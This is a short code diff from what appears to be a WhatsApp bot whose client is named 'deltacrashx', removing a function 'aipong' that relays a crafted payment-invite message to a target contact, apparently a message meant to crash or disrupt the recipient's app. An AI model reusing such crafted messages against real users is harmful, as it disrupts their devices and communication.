@@ -747,9 +747,6 @@ async function sendMixedMessages(jid, count) {
     await sleep(500);
   }
 }
-async function aipong(target) {
-await deltacrashx.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
-}
 function sendMessageWithMentions(text, mentions = [], quoted = false) {
   if (quoted == null || quoted == undefined || quoted == false) {
     return deltaxcrash.sendMessage(m.chat, {
